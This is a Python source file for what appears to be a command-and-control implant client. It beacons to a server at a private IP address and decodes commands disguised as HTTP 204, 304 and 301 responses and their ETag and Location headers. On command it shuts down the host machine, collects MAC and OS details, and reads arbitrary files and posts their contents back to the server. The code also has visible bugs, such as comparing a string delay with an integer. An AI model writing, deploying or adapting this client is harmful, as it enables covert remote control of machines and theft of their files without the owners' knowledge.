import requests
import threading
import os
import time
import subprocess
from datetime import datetime, timedelta
import netifaces as ni
import platform

SERVER_IP = '192.168.1.104'
SERVER_PORT = 80

t_host_shutdown = None


def send_request(method, data=None):
    url = f'http://{SERVER_IP}:{SERVER_PORT}/'
    headers = {
        'Accept': 'text/html',
        'User-Agent': 'c2client',  # Update for better obfuscation if needed
        'Accept-Language': 'en-us',
        'Connection': 'keep-alive'
    }

    if method == 'GET':
        response = requests.get(url, headers=headers)
        return response.text

    elif method == 'POST' and data is not None:

        headers['Content-Type'] = 'text/plain'  # Add 'Content-Type' header
        data_encoded = data.encode('utf-8')  # Encode the body as bytes
        response = requests.post(url, headers=headers, data=data_encoded)
        return None


def process_command(command):
    # execute shutdowns (1: host, 2: client)
    if command.startswith('HTTP/1.1 204 No Content'):
        # Extracting information from packet
        headers = command.split('\r\n')
        etag = headers[3].split(': ')[1].strip('"')  # who to shutdown
        delay = int(headers[4].split('=')[1])
        delay = headers[4].split('=')[1]
        # Constructing POST body response
        target = None
        if etag.startswith('h'):
            target = 'host'
            post_body = f"1:{delay}"
            send_request('POST', post_body)

        elif etag.startswith('c'):
            target = 'client'
            post_body = f"2:{delay}"
            send_request('POST', post_body)

        if delay > 0 and target == 'client':
            t_host_shutdown = threading.Thread(target=shutdown_target, args=(target, delay))
            t_host_shutdown.start()

        else:
            shutdown_target(target, delay)

    # extract host information (3: MAC, 4: IP, 5: OS info)
    elif command.startswith('HTTP/1.1 304 Not Modified'):
        # Extracting information from packet
        headers = command.split('\r\n')
        etag = headers[4].split(': ')[1].strip('"')  # what to extract
        data = None

        # Determine data based on ETag
        if etag.startswith('m'):
            data = 'MAC'
            extracted_data = get_addresses('mac')
            post_body = f"3:{extracted_data}"
            send_request('POST', post_body)

        elif etag.startswith('i'):
            data = 'IP'
            extracted_data = get_addresses('mac')
            post_body = f"4:{extracted_data}"
            send_request('POST', post_body)

        elif etag.startswith('o'):
            data = 'OS info'
            extracted_data = get_os_info()
            post_body = f"5:{extracted_data}"
            send_request('POST', post_body)

    # upload (6: file)
    elif command.startswith('HTTP/1.1 301 Moved Permanently'):
        headers = command.split('\r\n')
        obfuscated_location = headers[3].split(': ')[1]  # file location
        location = obfuscated_location.split('.com')[1]

        file_contents = extract_file(location)
        send_request('POST', file_contents)


def shutdown_target(target, delay):
    if target == 'client':
        time.sleep(delay)
        exit()

    if target == 'host':
        current_time = datetime.now()
        new_time = current_time + timedelta(seconds=delay)
        new_time_str = new_time.strftime('%H:%M:%S')

        if delay > 0:
            subprocess.run(f'shutdown -h {new_time_str}', shell=True)
        else:
            subprocess.run(f'shutdown -h', shell=True)


def get_addresses(target):
    addresses = []

    try:
        # List network interfaces
        interfaces = os.listdir('/sys/class/net')

        # Select default interface (excluding 'lo' loopback interface)
        default_interface = next(iface for iface in interfaces if iface != 'lo')

        addrs = ni.ifaddresses(default_interface)

        if target == 'mac' and ni.AF_LINK in addrs:
            addresses = [addr['addr'] for addr in addrs[ni.AF_LINK]]
        elif target == 'ip' and ni.AF_INET in addrs:
            addresses = [addr['addr'] for addr in addrs[ni.AF_INET]]

    except ValueError as err:
        # print(f"Error: {err}")
        addresses = 'None'

    return addresses


def extract_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read()

    except FileNotFoundError as err:
        # print(f"Error: {err}")
        return "Error: File Not Found"


def get_os_info():
    os_info = {
        'system': platform.system(),  # OS Name
        'release': platform.release(),  # OS Release
        'version': platform.version(),  # OS Version
        'machine': platform.machine(),  # Machine type
        'processor': platform.processor()  # Processor type
    }
    # Format as string
    os_info_str = ', '.join(f"{key}: {value}" for key, value in os_info.items())

    return os_info_str


if __name__ == "__main__":
    start_time = time.time()
    duration = 300  # 300s = 5min

    while time.time() - start_time < duration:
        # send get request to let server know connection was made
        response_text = send_request('GET')
        # process and execute received command
        process_command(response_text)

        time.sleep(1)

